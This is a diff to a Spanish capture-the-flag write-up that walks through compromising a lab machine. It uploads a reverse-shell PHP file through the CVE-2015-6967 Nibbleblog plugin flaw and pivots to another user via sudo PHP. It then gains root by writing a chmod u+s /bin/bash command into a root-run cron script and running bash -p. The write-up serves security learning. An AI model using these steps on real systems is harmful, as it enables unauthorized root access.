@@ -155,15 +155,15 @@ Nos da error, vemos bien el exploit en ExploitDb y nos infromamos por mas sitios
 
 ![myimagechocolate.png](assets/myimagechocolate.png)
 
-Tras leer el exploit decidí hacerlo manualmente, os dejo el [CVE 2015-6967](https://www.exploit-db.com/exploits/38489) para que lo consultéis también, basicamente se logea con las credenciales que le damos, sube un archivo imagen.php que es una reverse shell y ejecuta el archivo en la ruta /content/private/plugins/my_image/
+Tras leer el exploit decidí hacerlo manualmente, os dejo el [CVE 2015-6967](https://www.exploit-db.com/exploits/38489) para que lo consultéis también, básicamente se logea con las credenciales que le damos, sube un archivo imagen.php que es una reverse shell y ejecuta el archivo en la ruta /content/private/plugins/my_image/
 
-Insertamos el archivo .php, para acceder a este paneñl vamos a plugins y en my image le damos a isntall:
+Insertamos el archivo .php, para acceder a este panel vamos a plugins y en my image le damos a install:
 
 ![revshellmyimagechocolate.png](assets/revshellmyimagechocolate.png)
 
-En seleccionar archivo subimos una reverseshell.php, podeis conseguir el payload en la web [RevShells](https://www.revshells.com/)
+En seleccionar archivo subimos una reverseshell.php, podéis conseguir el payload en la web [RevShells](https://www.revshells.com/)
 
-DAmos a save changes y esperamos la respuesta:
+Damos a save changes y esperamos la respuesta:
 
 ![revshellnibbleupload.png](assets/revshellnibbleupload.png)
 
@@ -205,7 +205,7 @@ User www-data may run the following commands on 95e336f4d2b4:
 www-data@95e336f4d2b4:/$ 
 ```
 
-Y vemos que podemos hacer un movimiento lateral al ususario chocolate, vamos a [GTFOBINS: Sudo PHP](https://gtfobins.github.io/gtfobins/php/#sudo) y ponemos el comando personalizado a nuestro caso:
+Y vemos que podemos hacer un movimiento lateral al usuario chocolate, vamos a [GTFOBINS: Sudo PHP](https://gtfobins.github.io/gtfobins/php/#sudo) y ponemos el comando personalizado a nuestro caso:
 
 ![chocolateuser.png](assets/chocolateuser.png)
 
@@ -226,6 +226,7 @@ stty size NUM_FILAS NUM_COLUMNAS
 stty rows NUM_FILAS columns NUM_COLUMNAS
 ```
 
+Despues de enumerar permisos, enumero los procesos cronJobs y veo esto:
 
 ```bash
 chocolate@95e336f4d2b4:/$ stty rows 38 columns 190
@@ -259,7 +260,7 @@ chocolate@95e336f4d2b4:/$ ls -l /bin/bash
 -rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
 ```
 
-Vemos un proceso que se hace en /opt/script.php y ademas pertenece a chocolate pero se ejecuta como el usuario root, asi que vamos a modificar ese php  para que nos de una shell, y esperamos un rato a ver si obtenemos root:
+Vemos un proceso que se hace en /opt/script.php y ademas pertenece a chocolate pero se ejecuta como el usuario root, así que vamos a modificar ese php  para que nos de una shell, y esperamos un rato a ver si obtenemos root:
 
 ```bash
 chocolate@95e336f4d2b4:/$ echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
@@ -269,5 +270,8 @@ chocolate@95e336f4d2b4:/$ ls -l /bin/bash
 
 vemos que el archivo ahora pertenece a root, hacemos un whoami y ya hemos obtenido root:
 
-![rootChocolateLovers.png](assets/rootChocolateLovers.png)
+```bash
+chocolate@95e336f4d2b4:/$bash -p
+```
 
+![rootChocolateLovers.png](assets/rootChocolateLovers.png)
